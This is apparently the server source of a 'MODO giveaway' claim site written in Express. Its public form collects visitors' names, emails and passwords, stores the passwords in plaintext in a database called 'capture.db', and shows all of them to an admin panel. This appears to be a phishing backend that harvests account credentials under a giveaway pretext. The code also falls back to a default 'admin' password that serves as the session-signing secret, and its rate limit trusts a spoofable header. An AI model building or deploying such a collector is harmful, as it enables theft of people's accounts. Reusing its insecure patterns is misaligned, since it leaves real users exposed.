const express = require("express");
const path = require("node:path");
const fs = require("node:fs");
const { createHmac, timingSafeEqual } = require("node:crypto");
const { DatabaseSync } = require("node:sqlite");

const PORT = Number(process.env.PORT) || 3000;
const SESSION_TTL_MS = 12 * 60 * 60 * 1000;

function getAdminPassword() {
  if (process.env.ADMIN_PASSWORD) return process.env.ADMIN_PASSWORD;
  const envFile = path.join(__dirname, ".env.local");
  if (fs.existsSync(envFile)) {
    for (const line of fs.readFileSync(envFile, "utf8").split("\n")) {
      const m = line.match(/^\s*ADMIN_PASSWORD\s*=\s*(.+)\s*$/);
      if (m) return m[1].trim().replace(/^["']|["']$/g, "");
    }
  }
  return "admin";
}

fs.mkdirSync(path.join(__dirname, "data"), { recursive: true });
const db = new DatabaseSync(path.join(__dirname, "data", "capture.db"));
db.exec(`
  CREATE TABLE IF NOT EXISTS claims (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT NOT NULL,
    email TEXT NOT NULL,
    password TEXT NOT NULL,
    status TEXT NOT NULL DEFAULT 'pending',
    created_at TEXT NOT NULL,
    reviewed_at TEXT
  );
`);

const app = express();
app.use(express.json());

function readCookies(req) {
  const out = {};
  const raw = req.headers.cookie;
  if (raw) {
    for (const part of raw.split(";")) {
      const idx = part.indexOf("=");
      if (idx > 0) {
        out[part.slice(0, idx).trim()] = decodeURIComponent(
          part.slice(idx + 1).trim(),
        );
      }
    }
  }
  return out;
}

const SECRET = getAdminPassword();

function sign(payload) {
  return createHmac("sha256", SECRET).update(payload).digest("base64url");
}

function makeSessionToken() {
  const payload = String(Date.now() + SESSION_TTL_MS);
  return `${payload}.${sign(payload)}`;
}

function hasValidSession(req) {
  const token = readCookies(req).admin_session;
  if (!token) return false;
  const dot = token.indexOf(".");
  if (dot <= 0) return false;
  const payload = token.slice(0, dot);
  const sig = token.slice(dot + 1);
  const expected = sign(payload);
  const a = Buffer.from(sig);
  const b = Buffer.from(expected);
  if (a.length !== b.length || !timingSafeEqual(a, b)) return false;
  return Number(payload) > Date.now();
}

const rateLimits = new Map();
function allowClaim(ip) {
  const now = Date.now();
  const times = (rateLimits.get(ip) ?? []).filter(
    (t) => now - t < 60_000,
  );
  if (times.length >= 12) {
    rateLimits.set(ip, times);
    return false;
  }
  times.push(now);
  rateLimits.set(ip, times);
  return true;
}

app.get("/", (_req, res) => {
  res.sendFile(path.join(__dirname, "public", "claim.html"));
});

app.post("/api/claim", (req, res) => {
  const ip =
    req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
    req.socket.remoteAddress ||
    "local";
  if (!allowClaim(ip)) return res.status(429).json({ error: "Too many attempts. Please wait a moment and try again." });

  const name = String(req.body?.name ?? "").trim();
  const email = String(req.body?.email ?? "").trim();
  const password = String(req.body?.password ?? "").trim();

  db.prepare(
    "INSERT INTO claims (name, email, password, status, created_at) VALUES (?, ?, ?, 'pending', ?)",
  ).run(name, email, password, new Date().toISOString());

  res.json({ ok: true, name, email });
});

app.get("/admin", (_req, res) => {
  if (hasValidSession(_req)) return res.sendFile(path.join(__dirname, "public", "admin.html"));
  res.sendFile(path.join(__dirname, "public", "login.html"));
});

app.post("/api/admin/login", (req, res) => {
  const password = String(req.body?.password ?? "");
  if (!SECRET || password !== SECRET) {
    return res.status(401).json({ error: "Incorrect password" });
  }
  res.setHeader(
    "Set-Cookie",
    `admin_session=${makeSessionToken()}; HttpOnly; SameSite=Lax; Path=/; Max-Age=${SESSION_TTL_MS / 1000}`,
  );
  res.json({ ok: true });
});

app.post("/api/admin/logout", (_req, res) => {
  res.setHeader(
    "Set-Cookie",
    "admin_session=; HttpOnly; SameSite=Lax; Path=/; Max-Age=0",
  );
  res.json({ ok: true });
});

app.get("/api/admin/claims", (_req, res) => {
  if (!hasValidSession(_req)) return res.status(401).json({ error: "Unauthorized" });
  const claims = db
    .prepare(
      `SELECT * FROM claims
       ORDER BY CASE status WHEN 'pending' THEN 0 WHEN 'approved' THEN 1 ELSE 2 END, id DESC`,
    )
    .all()
    .map((row) => ({ ...row }));
  res.json({ claims });
});

app.post("/api/admin/approve", (req, res) => {
  if (!hasValidSession(req)) return res.status(401).json({ error: "Unauthorized" });
  const id = Number(req.body?.id);
  const password = String(req.body?.password ?? "").trim();
  if (!Number.isFinite(id) || !password) {
    return res.status(400).json({ error: "Missing id or password" });
  }
  const row = db
    .prepare("SELECT id, password FROM claims WHERE id = ?")
    .get(id);
  if (!row) return res.status(404).json({ error: "Claim not found" });
  if (row.password !== password) {
    return res.status(400).json({
      error:
        "Password doesn't match the one submitted. If the entry looks wrong, reject it.",
    });
  }
  db.prepare(
    "UPDATE claims SET status = 'approved', reviewed_at = ? WHERE id = ?",
  ).run(new Date().toISOString(), id);
  res.json({ ok: true });
});

app.post("/api/admin/reject", (req, res) => {
  if (!hasValidSession(req)) return res.status(401).json({ error: "Unauthorized" });
  const id = Number(req.body?.id);
  if (!Number.isFinite(id)) return res.status(400).json({ error: "Missing id" });
  db.prepare(
    "UPDATE claims SET status = 'rejected', reviewed_at = ? WHERE id = ?",
  ).run(new Date().toISOString(), id);
  res.json({ ok: true });
});

app.use(express.static(path.join(__dirname, "public")));

app.listen(PORT, () => {
  console.log(`MODO giveaway server running on http://localhost:${PORT}`);
});